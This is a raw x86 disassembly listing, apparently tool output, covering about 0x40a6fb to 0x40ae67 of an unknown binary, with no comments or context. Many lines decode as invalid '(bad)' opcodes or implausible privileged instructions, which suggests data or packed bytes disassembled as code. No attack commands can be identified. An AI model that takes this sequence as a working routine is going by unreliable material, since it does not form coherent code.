  40a6fb:	fiadd  WORD PTR [edi]
  40a6fd:	push   ecx
  40a6fe:	inc    ecx
  40a6ff:	dec    esp
  40a700:	call   DWORD PTR [esi-0x1d]
  40a703:	push   ecx
  40a704:	ret    0x32e5
  40a707:	mov    esi,0x8f84008a
  40a70c:	jge    0x40a71a
  40a70e:	fsub   DWORD PTR [eax+0x15]
  40a711:	call   FWORD PTR [ebp-0xb8a0104]
  40a717:	(bad)  [eax+ecx*1+0x20]
  40a71b:	pushf  
  40a71c:	jmp    0x40a71d
  40a71e:	daa    
  40a71f:	(bad)  [esp+ecx*1+0x30]
  40a723:	xchg   edi,eax
  40a724:	(bad)  
  40a727:	and    eax,0x41980cc2
  40a72c:	mov    ch,ah
  40a72e:	sbb    edx,eax
  40a730:	sti    
  40a731:	push   0x0
  40a733:	mov    bl,bl
  40a735:	je     0x40a74b
  40a737:	xchg   DWORD PTR [eax+0xf],esp
  40a73a:	(bad)  
  40a73b:	in     eax,dx
  40a73c:	or     al,ch
  40a73e:	cdq    
  40a73f:	rcr    dl,0xfe
  40a742:	or     ecx,eax
  40a744:	popa   
  40a745:	pop    ebx
  40a746:	mov    DWORD PTR [ebp-0x27],ecx
  40a749:	addr16 sti 
  40a74b:	dec    ebx
  40a74c:	dec    esp
  40a74d:	(bad)  
  40a74e:	(bad)  
  40a74f:	sbb    eax,0x910ce7d9
  40a754:	(bad)  
  40a756:	push   0xbeef0c48
  40a75b:	or     dl,bl
  40a75d:	je     0x40a767
  40a75f:	mov    al,ds:0xa7ffffb0
  40a764:	inc    ebp
  40a765:	add    eax,0xff0d0954
  40a76a:	jne    0x40a720
  40a76c:	(bad)  
  40a76d:	lock enter 0xdaa7,0x67
  40a772:	add    DWORD PTR [eax],ecx
  40a774:	jmp    0x60c7f836
  40a779:	pop    es
  40a77a:	call   0x3f8201
  40a77f:	loopne 0x40a77b
  40a781:	push   ebx
  40a782:	inc    ecx
  40a783:	xor    DWORD PTR [edx+0x70],esi
  40a786:	jne    0x40a77d
  40a788:	leave  
  40a789:	pop    ecx
  40a78a:	enter  0xceee,0xdb
  40a78e:	add    DWORD PTR [ecx],esi
  40a790:	xlat   BYTE PTR ds:[ebx]
  40a791:	mov    cl,0x50
  40a793:	fisub  WORD PTR [ebx+edi*8+0x374600e7]
  40a79a:	jno    0x40a79b
  40a79c:	into   
  40a79d:	test   BYTE PTR [edi-0x18],ch
  40a7a0:	adc    BYTE PTR ds:0x33e8ff71,ch
  40a7a6:	adc    al,0x0
  40a7a8:	pop    esp
  40a7a9:	jmp    0x40a80a
  40a7ab:	push   0xffc2864f
  40a7b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7b1:	fdiv   st(6),st
  40a7b3:	out    0xcd,eax
  40a7b5:	sub    DWORD PTR [ecx-0x1],esi
  40a7b8:	xchg   esi,eax
  40a7b9:	fcom   QWORD PTR [edx]
  40a7bb:	push   eax
  40a7bc:	cdq    
  40a7bd:	inc    esi
  40a7be:	cmp    edi,edi
  40a7c0:	xchg   BYTE PTR [esi-0xa],al
  40a7c3:	adc    esp,ecx
  40a7c5:	test   BYTE PTR ds:[edi],0x89
  40a7c9:	pop    ss
  40a7ca:	jno    0x40a7cb
  40a7cc:	outs   dx,BYTE PTR ds:[esi]
  40a7cd:	mov    ecx,0x71f0541d
  40a7d2:	jo     0x40a849
  40a7d4:	sub    eax,0x56c87d4a
  40a7d9:	mov    dh,0x70
  40a7db:	jne    0x40a7fe
  40a7dd:	and    bl,BYTE PTR [ebp+edx*8+0x79]
  40a7e1:	xchg   BYTE PTR [eax-0x1],dh
  40a7e4:	les    esp,FWORD PTR [ebp-0x2d]
  40a7e7:	(bad)  
  40a7e8:	mov    esp,0x2e1c5b69
  40a7ed:	nop
  40a7ee:	jo     0x40a7b9
  40a7f0:	repz inc eax
  40a7f2:	add    edx,DWORD PTR [ebp-0x56]
  40a7f5:	mov    WORD PTR [esp+eax*8+0xbf5f815],es
  40a7fc:	add    BYTE PTR [ecx],bl
  40a7fe:	or     al,BYTE PTR ds:0xf267063b
  40a804:	inc    ebx
  40a805:	test   ebx,edx
  40a807:	pop    edi
  40a808:	(bad)  
  40a809:	cli    
  40a80a:	icebp  
  40a80b:	call   0xd1e88613
  40a810:	ins    BYTE PTR es:[edi],dx
  40a811:	or     al,0xe8
  40a814:	jo     0x40a87a
  40a816:	gs imul BYTE PTR ss:[esi]
  40a81a:	jno    0x40a87e
  40a81c:	jo     0x40a7ec
  40a81e:	xchg   cx,ax
  40a820:	add    dh,BYTE PTR [ecx]
  40a822:	jbe    0x40a883
  40a824:	(bad)  [edi*4-0x2349fc59]
  40a82b:	or     al,0x70
  40a82d:	and    al,0x11
  40a82f:	adc    ecx,edi
  40a831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a832:	data16 (bad) 
  40a834:	fidiv  DWORD PTR [eax]
  40a836:	or     DWORD PTR [esi],eax
  40a838:	mov    cl,0x9
  40a83a:	clc    
  40a83b:	xchg   esp,eax
  40a83c:	ret    0x678e
  40a83f:	pop    esp
  40a840:	jo     0x40a7c8
  40a842:	fdivr  st(0),st
  40a844:	pop    ebx
  40a845:	adc    BYTE PTR [esi-0x2a],ah
  40a848:	outs   dx,DWORD PTR ds:[esi]
  40a849:	jbe    0x40a827
  40a84b:	int3   
  40a84c:	pop    esp
  40a84d:	out    0x4c,eax
  40a84f:	(bad)  
  40a850:	outs   dx,DWORD PTR ds:[esi]
  40a851:	js     0x40a89e
  40a853:	icebp  
  40a854:	add    eax,DWORD PTR [edx+edx*4]
  40a857:	lds    eax,FWORD PTR [ebx+0x443656d]
  40a85d:	fisttp DWORD PTR [ebx]
  40a85f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a860:	stc    
  40a861:	add    BYTE PTR [esi],ch
  40a863:	jno    0x40a7e6
  40a865:	inc    ebp
  40a866:	ds pushaw 
  40a869:	leave  
  40a86a:	cmp    dh,cl
  40a86c:	pushf  
  40a86d:	shl    DWORD PTR [ecx+0x9],cl
  40a870:	adc    DWORD PTR [edx+0x6ee8c882],edx
  40a876:	fs lahf 
  40a878:	add    BYTE PTR [ecx],ah
  40a87a:	in     al,dx
  40a87b:	gs (bad) 
  40a87d:	hlt    
  40a87e:	or     ch,BYTE PTR [esi-0x52]
  40a881:	addr16 xchg esi,eax
  40a883:	pushw  0xe23f
  40a887:	enter  0xc0ff,0xcc
  40a88b:	mov    ecx,0x1c5fe940
  40a890:	mov    dh,0xb1
  40a892:	in     eax,dx
  40a893:	gs (bad) 
  40a895:	mov    ah,0xda
  40a897:	ins    DWORD PTR es:[edi],dx
  40a898:	xchg   esi,eax
  40a899:	aaa    
  40a89a:	inc    esi
  40a89b:	pushw  0xe24a
  40a89f:	enter  0x90ff,0xa0
  40a8a3:	mov    ecx,0x1c4fe940
  40a8a8:	mov    dh,0xa1
  40a8aa:	in     eax,dx
  40a8ab:	gs (bad) 
  40a8ad:	xchg   esp,eax
  40a8ae:	stos   BYTE PTR es:[edi],al
  40a8af:	ins    DWORD PTR es:[edi],dx
  40a8b0:	jle    0x40a8b9
  40a8b2:	push   ss
  40a8b3:	pushw  0x83f9
  40a8b7:	enter  0x80ff,0xc0
  40a8bb:	mov    ecx,0x1c1fe940
  40a8c0:	mov    dh,0x31
  40a8c2:	ins    BYTE PTR es:[edi],dx
  40a8c3:	gs (bad) 
  40a8c5:	push   esp
  40a8c6:	add    BYTE PTR [ebp+0x6d],bh
  40a8c9:	data16 xlat BYTE PTR ds:[ebx]
  40a8cb:	pop    es
  40a8cc:	pushw  0x839d
  40a8d0:	enter  0x50ff,0x95
  40a8d4:	mov    ecx,0x1bcfe940
  40a8d9:	mov    dh,0x21
  40a8db:	ins    BYTE PTR es:[edi],dx
  40a8dc:	gs (bad) 
  40a8de:	xor    al,0x4d
  40a8e0:	ins    DWORD PTR es:[edi],dx
  40a8e1:	dec    esi
  40a8e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8e3:	xlat   BYTE PTR ds:[ebx]
  40a8e4:	gs push 0xffc863bf
  40a8ea:	add    BYTE PTR [ebp-0x6016bf47],al
  40a8f0:	push   ds
  40a8f1:	mov    dh,0x0
  40a8f3:	pusha  
  40a8f4:	dec    esi
  40a8f5:	(bad)  
  40a8f6:	(bad)  
  40a8f7:	and    eax,0x9e36e761
  40a8fc:	repz (bad) 
  40a8fe:	push   0x4037bb
  40a903:	loopne 0x40a8b5
  40a905:	push   ebx
  40a906:	inc    ecx
  40a907:	or     ah,dh
  40a909:	xor    al,0xb6
  40a90b:	ror    BYTE PTR [ebp-0x1],1
  40a90e:	inc    BYTE PTR ds:0x6e1ee761
  40a914:	repz (bad) 
  40a916:	push   0x403718
  40a91b:	lock mov al,0x53
  40a91e:	inc    ecx
  40a91f:	fdiv   st,st(3)
  40a921:	xor    al,0xb6
  40a923:	or     BYTE PTR [ebp-0x1],0xfe
  40a927:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a928:	pusha  
  40a929:	out    0x6,eax
  40a92b:	add    BYTE PTR [esi],bl
  40a92d:	repz (bad) 
  40a92f:	push   0x40374c
  40a934:	sar    BYTE PTR [edx+0x53],0x41
  40a938:	mov    BYTE PTR [eax+0x1],al
  40a93b:	add    BYTE PTR [eax-0x6f8a0078],cl
  40a941:	shr    dh,0xfd
  40a944:	(bad)  
  40a945:	mul    BYTE PTR [edi-0x22]
  40a948:	cmp    ecx,DWORD PTR [eax-0x1]
  40a94b:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40a94d:	cmp    al,BYTE PTR [eax+0x0]
  40a950:	lock push es
  40a952:	add    BYTE PTR [eax],al
  40a954:	fdiv   st,st(5)
  40a956:	je     0x40a960
  40a958:	adc    ch,0xfc
  40a95b:	call   FWORD PTR [edi+0x1953e245]
  40a961:	or     eax,0x480b9268
  40a966:	jmp    DWORD PTR [edi+0x4a]
  40a969:	or     BYTE PTR [eax],al
  40a96b:	xor    BYTE PTR [ecx],0x7b
  40a96e:	test   DWORD PTR [edi],0xff6fb119
  40a974:	es cli 
  40a976:	jae    0x40a9cb
  40a978:	jo     0x40a9ec
  40a97a:	fist   DWORD PTR [ecx+0x68043182]
  40a980:	xor    esi,DWORD PTR [edx+0x3]
  40a983:	add    BYTE PTR [esi],0x45
  40a986:	sti    
  40a987:	out    0xcb,eax
  40a989:	les    ebp,FWORD PTR [edi+edi*8-0x77]
  40a98d:	rol    DWORD PTR cs:[eax+0x0],1
  40a991:	xor    DWORD PTR [edx-0x55],ecx
  40a994:	push   ebx
  40a995:	jo     0x40aa09
  40a997:	fild   DWORD PTR [ecx]
  40a999:	xor    DWORD PTR [edx-0x7d],esi
  40a99c:	call   FWORD PTR [edx+ebp*2+0x5b]
  40a9a0:	xchg   ebx,eax
  40a9a1:	int3   
  40a9a2:	xor    ch,BYTE PTR [ebp+0x68]
  40a9a5:	out    0x9e,eax
  40a9a7:	ret    0x56ff
  40a9aa:	jmp    0x1:0x8a3140d0
  40a9b1:	xor    edx,esi
  40a9b3:	ins    BYTE PTR es:[edi],dx
  40a9b4:	jne    0x40a9ef
  40a9b6:	cli    
  40a9b7:	out    dx,eax
  40a9b8:	cld    
  40a9b9:	sahf   
  40a9ba:	(bad)  
  40a9bb:	fnclex 
  40a9bd:	add    dh,BYTE PTR [ecx+0x7ec96803]
  40a9c3:	ret    0xeff
  40a9c6:	jo     0x40a9cb
  40a9c8:	add    BYTE PTR [ecx-0x76f809be],dh
  40a9ce:	aam    0x6e
  40a9d0:	jmp    FWORD PTR [esi-0x37]
  40a9d3:	jae    0x40aa28
  40a9d5:	lock jno 0x40a9b3
  40a9d8:	mov    bh,0x2
  40a9da:	xor    DWORD PTR [eax+ebp*2],eax
  40a9dd:	xor    esi,DWORD PTR [edx+0x3]
  40a9e0:	or     BYTE PTR [esi+0x1c],0xfc
  40a9e4:	out    0xf7,eax
  40a9e6:	or     BYTE PTR [esp+ebp*2+0x6d02ee3e],ah
  40a9ed:	mov    esp,0x2cfa8110
  40a9f2:	arpl   WORD PTR [esi+0x625300d9],cx
  40a9f8:	cld    
  40a9f9:	sti    
  40a9fa:	push   ss
  40a9fb:	arpl   WORD PTR [esp+ebp*2+0x16],di
  40a9ff:	lock aam 0x6c
  40aa02:	test   BYTE PTR [ecx],dl
  40aa04:	xor    DWORD PTR [esi+0x4],0x846c6663
  40aa0b:	gs pop esi
  40aa0d:	imul   BYTE PTR [esi]
  40aa0f:	jno    0x40aa24
  40aa11:	inc    esp
  40aa12:	out    dx,al
  40aa13:	bound  esp,QWORD PTR [eax]
  40aa15:	inc    ecx
  40aa16:	sub    eax,0xcd789c09
  40aa1b:	xchg   BYTE PTR [edi+edi*8-0x2436292a],bh
  40aa22:	jno    0x40a9e1
  40aa24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa25:	add    eax,esi
  40aa27:	fdivr  st(4),st
  40aa29:	pop    ebx
  40aa2a:	jo     0x40aa77
  40aa2c:	push   ds
  40aa2d:	ins    BYTE PTR es:[edi],dx
  40aa2e:	popa   
  40aa2f:	icebp  
  40aa30:	call   0xb9e44838
  40aa35:	ins    BYTE PTR es:[edi],dx
  40aa36:	sbb    al,0x11
  40aa38:	adc    DWORD PTR [ebx+0x5afe6289],esp
  40aa3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa3f:	inc    edi
  40aa40:	imul   BYTE PTR [ebx+0x19]
  40aa43:	mov    bh,0x94
  40aa45:	ret    0x6386
  40aa48:	pop    esp
  40aa49:	clc    
  40aa4a:	xchg   esi,eax
  40aa4b:	sub    DWORD PTR [edi+0x40b9766b],esp
  40aa51:	add    eax,0xd48f7231
  40aa56:	addr16 fdivr st(0),st
  40aa59:	pop    ebx
  40aa5a:	add    dh,bl
  40aa5c:	jo     0x40aa1c
  40aa5e:	imul   ecx,DWORD PTR [ecx-0xc],0xffffffff
  40aa62:	stos   BYTE PTR es:[edi],al
  40aa63:	fisub  DWORD PTR [ecx+0x68]
  40aa66:	inc    esp
  40aa67:	popa   
  40aa68:	leave  
  40aa69:	jmp    DWORD PTR [ebp-0x6117f1c0]
  40aa6f:	lock popa 
  40aa71:	(bad)  
  40aa72:	cmp    DWORD PTR ds:0xdb7e0008,ecx
  40aa78:	mov    eax,0x6a1afcfe
  40aa7d:	pop    esi
  40aa7e:	xchg   ecx,eax
  40aa7f:	mov    ah,BYTE PTR [edx-0x18]
  40aa82:	and    eax,0xa0ff6277
  40aa87:	outs   dx,DWORD PTR ds:[esi]
  40aa88:	adc    DWORD PTR [eax],eax
  40aa8a:	mov    esp,0xd4ff757f
  40aa8f:	(bad)  
  40aa90:	imul   edx,DWORD PTR [ebp+0xb625a2f],0x67ffe129
  40aa9a:	(bad)  
  40aa9b:	out    dx,al
  40aa9c:	enter  0x98ff,0x7a
  40aaa0:	sub    dh,al
  40aaa2:	ss pop edx
  40aaa4:	mov    ecx,0x9c02e4f
  40aaa9:	call   0xffa2f643
  40aaae:	adc    DWORD PTR [edx],ebp
  40aab0:	inc    edi
  40aab1:	call   DWORD PTR [esi]
  40aab3:	ins    BYTE PTR es:[edi],dx
  40aab4:	inc    edi
  40aab5:	or     cl,ch
  40aab7:	or     DWORD PTR [esi+0x68f16aec],0xb00e96a
  40aac1:	fmul   QWORD PTR [edi]
  40aac3:	test   BYTE PTR [ecx-0x3f4b00f3],0xd0
  40aaca:	inc    eax
  40aacb:	jmp    0xdf05a9aa
  40aad0:	or     edx,DWORD PTR [eax+0x618cdd45]
  40aad6:	(bad)  
  40aad7:	push   esp
  40aad8:	inc    ecx
  40aad9:	bound  esi,QWORD PTR [ebp+0x0]
  40aadc:	fs out dx,al
  40aade:	xor    al,0xb6
  40aae0:	and    BYTE PTR [edi+edi*8-0x19],cl
  40aae4:	pop    esp
  40aae5:	enter  0xfffe,0xd1
  40aae9:	dec    eax
  40aaea:	sti    
  40aaeb:	push   0x48
  40aaed:	out    dx,al
  40aaee:	je     0x40ab08
  40aaf0:	xchg   edi,eax
  40aaf1:	pop    eax
  40aaf2:	or     edi,edi
  40aaf4:	or     eax,0x1841489b
  40aaf9:	(bad)
  40aafc:	mov    bh,0xf3
  40aafe:	mov    BYTE PTR [ebp-0x50],al
  40ab01:	loope  0x40ab47
  40ab03:	call   0x1cb59f30
  40ab08:	xchg   edi,eax
  40ab09:	pop    ecx
  40ab0a:	or     edi,edi
  40ab0c:	sbb    eax,0x841489b
  40ab11:	(bad)
  40ab14:	xchg   ebx,esi
  40ab16:	mov    BYTE PTR [ebp-0x78],al
  40ab19:	ds (bad) 
  40ab1b:	(bad)  
  40ab1c:	popf   
  40ab1d:	sub    al,0xff
  40ab1f:	jne    0x40aae5
  40ab21:	repz xor al,0xb6
  40ab24:	add    BYTE PTR [eax+0x18e7ff45],dl
  40ab2a:	and    bh,bh
  40ab2c:	inc    DWORD PTR [ecx+0x49]
  40ab2f:	jmp    0x40aabe
  40ab31:	(bad)  
  40ab32:	in     al,dx
  40ab33:	dec    edi
  40ab34:	dec    ebp
  40ab36:	add    bh,bh
  40ab38:	jne    0x40aabe
  40ab3a:	repz xor al,0xb6
  40ab3d:	loopne 0x40ab84
  40ab3f:	jmp    edi
  40ab41:	add    BYTE PTR [eax],ah
  40ab43:	(bad)  
  40ab44:	call   DWORD PTR [ecx]
  40ab46:	dec    ecx
  40ab47:	jecxz  0x40aacc
  40ab49:	adc    eax,0xc0effe8
  40ab4e:	jns    0x40ab50
  40ab50:	add    BYTE PTR [eax+0x31f87d85],cl
  40ab56:	jb     0x40ab50
  40ab58:	cmp    DWORD PTR [ebx-0x4dfffc8e],0xffffffc5
  40ab5f:	outs   dx,DWORD PTR ds:[esi]
  40ab60:	add    BYTE PTR [esi],ah
  40ab62:	out    0x83,al
  40ab64:	add    BYTE PTR [ecx],dh
  40ab66:	jb     0x40abd0
  40ab68:	jne    0x40ab83
  40ab6a:	scas   eax,DWORD PTR es:[edi]
  40ab6b:	out    dx,eax
  40ab6c:	pop    es
  40ab6d:	dec    ecx
  40ab6e:	pop    ebp
  40ab6f:	test   eax,0xef7f36ff
  40ab74:	sti    
  40ab75:	cs std 
  40ab77:	sti    
  40ab78:	out    0x95,eax
  40ab7a:	shr    BYTE PTR [eax-0x1],1
  40ab7d:	push   ds
  40ab7e:	pop    ebp
  40ab7f:	imul   edi,edi,0xffffff9c
  40ab82:	pop    edx
  40ab83:	pop    ebx
  40ab84:	popa   
  40ab85:	iret   
  40ab86:	(bad)  
  40ab87:	push   0xd67c00ff
  40ab8c:	push   0xd1ba2975
  40ab91:	mov    ebp,0x7d82bef6
  40ab96:	sbb    DWORD PTR [ebx+0x3],esp
  40ab99:	out    dx,eax
  40ab9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab9b:	xor    al,0xf6
  40ab9d:	(bad)  
  40ab9e:	and    ch,BYTE PTR fs:[ecx+0x75]
  40aba2:	sub    DWORD PTR [edx+0x16cebdc5],edi
  40aba8:	pop    ebp
  40aba9:	push   cs
  40abaa:	(bad)  
  40abab:	xchg   esp,eax
  40abac:	pop    ebx
  40abad:	inc    DWORD PTR [edx+eax*1+0x69]
  40abb1:	jne    0x40abdc
  40abb3:	cli    
  40abb4:	add    DWORD PTR [esi+0x7568f6ae],edi
  40abba:	xchg   ebp,eax
  40abbb:	push   cs
  40abbc:	out    dx,eax
  40abbd:	pop    es
  40abbe:	mov    DWORD PTR [esi-0x57],ecx
  40abc1:	call   DWORD PTR [esi+0x31e3e6f2]
  40abc7:	fimul  WORD PTR ds:0x120483
  40abcd:	jne    0x40abfd
  40abcf:	or     DWORD PTR [edx-0x42],esi
  40abd2:	xchg   edx,eax
  40abd3:	pop    edi
  40abd4:	sbb    DWORD PTR [ecx-0x1c],ebp
  40abd7:	adc    cl,al
  40abd9:	xchg   edi,eax
  40abda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abdb:	pop    edi
  40abdc:	into   
  40abdd:	pop    esp
  40abde:	sub    esi,ebx
  40abe0:	call   0xd151884d
  40abe5:	mov    ds:0x68b65f8c,eax
  40abea:	mov    esp,0x60c154
  40abef:	jno    0x40ac50
  40abf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abf2:	push   0x48915cbc
  40abf7:	icebp  
  40abf8:	pop    esi
  40abf9:	xchg   esi,eax
  40abfa:	push   0x5081619c
  40abff:	icebp  
  40ac00:	pop    esi
  40ac01:	xchg   BYTE PTR [eax-0x64],ch
  40ac04:	pop    ecx
  40ac05:	xchg   ecx,eax
  40ac06:	cmp    cl,dh
  40ac08:	pop    esi
  40ac09:	jbe    0x40ac73
  40ac0b:	jl     0x40ac7a
  40ac0d:	add    DWORD PTR [eax-0xf],0x7c68665e
  40ac14:	gs push ecx
  40ac16:	test   al,0xf1
  40ac18:	pop    esi
  40ac19:	push   esi
  40ac1a:	cmp    dh,bl
  40ac1c:	and    eax,0x6dabcee9
  40ac21:	push   0x3e56e13f
  40ac26:	push   0x58e8fa59
  40ac2b:	xchg   ecx,esi
  40ac2d:	sbb    al,0xcf
  40ac2f:	jno    0x40ac3a
  40ac31:	xchg   ecx,eax
  40ac32:	inc    edx
  40ac33:	pop    ebp
  40ac34:	enter  0xdbe8,0xea
  40ac38:	mov    ch,0xa7
  40ac3a:	add    ebx,DWORD PTR [ecx]
  40ac3c:	fwait
  40ac3d:	mov    ch,0xc2
  40ac3f:	sahf   
  40ac40:	out    0x53,al
  40ac42:	iret   
  40ac43:	icebp  
  40ac44:	or     BYTE PTR [ecx-0x381a50],dl
  40ac4a:	call   0xee4c8068
  40ac4f:	mov    WORD PTR [esi],es
  40ac51:	call   0x5e4faca6
  40ac56:	call   DWORD PTR [ecx+0x42]
  40ac59:	or     edi,ebp
  40ac5b:	xchg   edi,eax
  40ac5c:	test   DWORD PTR ds:0xf1352855,ecx
  40ac62:	pop    es
  40ac63:	sbb    al,0x6c
  40ac65:	pop    esi
  40ac66:	addr16 mov ebp,0x40ffc961
  40ac6c:	shl    DWORD PTR [eax+eax*2+0x54365ae9],1
  40ac73:	sub    BYTE PTR ds:0xf435eff1,ch
  40ac79:	pop    ebp
  40ac7a:	(bad)  
  40ac7b:	sbb    al,0x29
  40ac7d:	pop    edi
  40ac7e:	jne    0x40ac61
  40ac80:	jp     0x40aca4
  40ac82:	inc    BYTE PTR [esi-0x16ec0e72]
  40ac88:	addr16 lahf 
  40ac8a:	push   0xffc8e004
  40ac8f:	add    cl,ch
  40ac91:	mov    ah,0x40
  40ac93:	jmp    0xa8957f72
  40ac98:	xor    dh,cl
  40ac9a:	sub    BYTE PTR [ebp+ebp*8+0x1f1675d],bh
  40aca1:	leave  
  40aca2:	call   eax
  40aca4:	or     BYTE PTR [eax+eax*2+0xbd457e9],dh
  40acab:	rol    BYTE PTR ss:0x5e54dce8,0xff
  40acb3:	je     0x40aca5
  40acb5:	popa   
  40acb6:	push   eax
  40acb7:	push   ds
  40acb8:	add    BYTE PTR [eax-0x2b2300ef],ah
  40acbe:	rol    BYTE PTR [eax-0x17],1
  40acc1:	cli    
  40acc2:	shr    BYTE PTR [ebx+0xb098800],1
  40acc8:	rol    BYTE PTR ds:0x8045c670,0x9
  40accf:	add    BYTE PTR [eax],al
  40acd1:	mov    BYTE PTR [esi],bl
  40acd3:	inc    ebp
  40acd4:	hlt    
  40acd5:	(bad)  
  40acd6:	pop    esi
  40acd7:	(bad)  
  40acd8:	inc    DWORD PTR [edx]
  40acda:	add    eax,0x4f2006a
  40acdf:	push   0x0
  40ace1:	std    
  40ace2:	dec    eax
  40ace3:	repz push eax
  40ace5:	fisttp QWORD PTR [eax-0x1970080c]
  40aceb:	dec    edi
  40acec:	inc    DWORD PTR ds:0x8c75feed
  40acf2:	rcr    DWORD PTR ds:0xb0948ac,0xc0
  40acf9:	inc    esp
  40acfa:	pop    es
  40acfb:	jmp    0x40ad3d
  40acfd:	xor    BYTE PTR [edi+0x48],dh
  40ad00:	inc    ecx
  40ad01:	or     ah,ah
  40ad03:	je     0x40ad11
  40ad05:	rcr    BYTE PTR [edx-0x3e],0xff
  40ad09:	(bad)  
  40ad0a:	(bad)  
  40ad0c:	lea    edx,[ebp-0x70000914]
  40ad12:	cmp    BYTE PTR [ecx-0x18],dl
  40ad15:	xchg   edi,eax
  40ad16:	(bad)  
  40ad17:	(bad)  
  40ad18:	jmp    DWORD PTR [ecx-0x77]
  40ad1b:	lock test DWORD PTR [eax],0xb5fee37f
  40ad22:	js     0x40ad0f
  40ad24:	(bad)  
  40ad25:	jmp    FWORD PTR [edi+0x59]
  40ad28:	pop    es
  40ad29:	call   0x3f9333
  40ad2e:	call   FWORD PTR [eax-0x1cf00810]
  40ad34:	out    0xa5,eax
  40ad36:	dec    edi
  40ad37:	jecxz  0x40ad37
  40ad39:	call   ebp
  40ad3b:	lock jmp 0x89fb:0xeff33195
  40ad43:	es call 0x3108:0x41193100
  40ad4b:	jne    0x40adc7
  40ad4d:	in     al,dx
  40ad4e:	mov    dl,0x2e
  40ad50:	addr16 push 0x31
  40ad53:	mov    ch,bh
  40ad55:	(bad)  
  40ad56:	cld    
  40ad57:	pop    ecx
  40ad58:	pop    ebx
  40ad59:	mov    edx,0x89653bad
  40ad5e:	in     al,dx
  40ad5f:	xor    eax,0x310573dc
  40ad64:	add    al,0xff
  40ad66:	fcomp  QWORD PTR [ecx+0x5b]
  40ad69:	mov    bh,0x4f
  40ad6b:	fwait
  40ad6c:	gs push 0x31
  40ad6f:	retf   0x54a2
  40ad72:	lock jno 0x40ad50
  40ad75:	jae    0x40ad54
  40ad77:	xor    BYTE PTR [edi+edi*8],al
  40ad7a:	fs mov ah,0xbb
  40ad7d:	inc    eax
  40ad7e:	xor    DWORD PTR [edx+0x1e00c1f1],ecx
  40ad84:	mov    edi,ecx
  40ad86:	mov    edi,0x4fd3539d
  40ad8b:	push   cs
  40ad8c:	push   ebp
  40ad8d:	sti    
  40ad8e:	out    0x9c,eax
  40ad90:	aad    0x64
  40ad92:	dec    DWORD PTR [ecx]
  40ad94:	sub    ah,BYTE PTR [ebp+0x337f6ff]
  40ad9a:	push   0xffc299c5
  40ad9f:	dec    esi
  40ada0:	jmp    0x40ad71
  40ada2:	inc    eax
  40ada3:	xor    ebx,ecx
  40ada5:	cs mov dh,0x69
  40ada8:	mov    cl,0x3
  40adaa:	call   0xffa5de27
  40adaf:	cmp    dh,BYTE PTR [edx]
  40adb1:	lock push cs
  40adb3:	popa   
  40adb4:	and    BYTE PTR [ebp+esi*2+0x29],0x9
  40adb9:	adc    ecx,ebx
  40adbb:	stos   BYTE PTR es:[edi],al
  40adbc:	pop    ebx
  40adbd:	push   ds
  40adbe:	pop    esp
  40adbf:	inc    edi
  40adc0:	pushf  
  40adc1:	push   ss
  40adc2:	or     ecx,DWORD PTR gs:[ecx]
  40adc5:	and    DWORD PTR [edx-0x24173603],0x3a7b502
  40adcf:	sbb    DWORD PTR [edi],eax
  40add1:	jmp    0xc9b15ed9
  40add6:	inc    ecx
  40add7:	jbe    0x40ae34
  40add9:	repnz inc ebx
  40addb:	in     eax,0xb
  40addd:	cmp    esp,edx
  40addf:	addr16 aad 0xe0
  40ade2:	pop    ebx
  40ade3:	repz pop esp
  40ade5:	into   
  40ade6:	add    BYTE PTR fs:[ecx+0x55],cl
  40adea:	xchg   DWORD PTR [esi+ecx*2-0x12],esp
  40adee:	call   0x281150ce
  40adf3:	add    al,0xc9
  40adf5:	adc    DWORD PTR ds:0xeae336c3,0x3
  40adfc:	xor    DWORD PTR [ecx+0x5af06c91],ecx
  40ae02:	xchg   esi,eax
  40ae03:	clc    
  40ae04:	(bad)  
  40ae06:	fst    st(3)
  40ae08:	pop    dx
  40ae0a:	cld    
  40ae0b:	sti    
  40ae0c:	push   ss
  40ae0d:	add    DWORD PTR [ebp+0x64],edi
  40ae10:	push   es
  40ae11:	jb     0x40adb8
  40ae13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae14:	(bad)  
  40ae15:	pop    edx
  40ae16:	add    ecx,DWORD PTR [edx]
  40ae18:	not    ah
  40ae1a:	lock pop ebx
  40ae1c:	imul   ebx,DWORD PTR [ebp+0x5e],0x64
  40ae20:	pop    ebx
  40ae21:	es push esi
  40ae23:	out    dx,al
  40ae24:	ss jno 0x40ae00
  40ae27:	addr16 (bad) 
  40ae29:	pop    edx
  40ae2a:	rol    DWORD PTR [edi],cl
  40ae2c:	into   
  40ae2d:	aam    0xf0
  40ae2f:	pop    ebx
  40ae30:	dec    edi
  40ae31:	pop    ebp
  40ae32:	add    BYTE PTR [esi],dh
  40ae34:	push   ebp
  40ae35:	pop    edx
  40ae36:	jne    0x40ae65
  40ae38:	dec    ebp
  40ae39:	aam    0x7
  40ae3b:	adc    DWORD PTR [ebx-0x63],edx
  40ae3e:	call   FWORD PTR [esi]
  40ae40:	imul   eax,DWORD PTR [edi+0x4],0xffffffe9
  40ae44:	outs   dx,DWORD PTR ds:[esi]
  40ae45:	(bad)  
  40ae46:	in     al,dx
  40ae47:	push   0x56
  40ae49:	pop    ebp
  40ae4a:	push   esi
  40ae4b:	sahf   
  40ae4c:	add    BYTE PTR [eax+0x5a],ch
  40ae4f:	imul   esp,esi,0x107d40d
  40ae55:	icebp  
  40ae56:	popf   
  40ae57:	(bad)  
  40ae58:	out    dx,al
  40ae59:	clc    
  40ae5a:	ret    
  40ae5b:	sti    
  40ae5c:	jb     0x40aea6
  40ae5e:	pop    ds
  40ae5f:	dec    eax
  40ae60:	sub    BYTE PTR ds:0x6d173d8e,ch
  40ae66:	leave  
  40ae67:	jmp    FWORD PTR [eax+0x12]
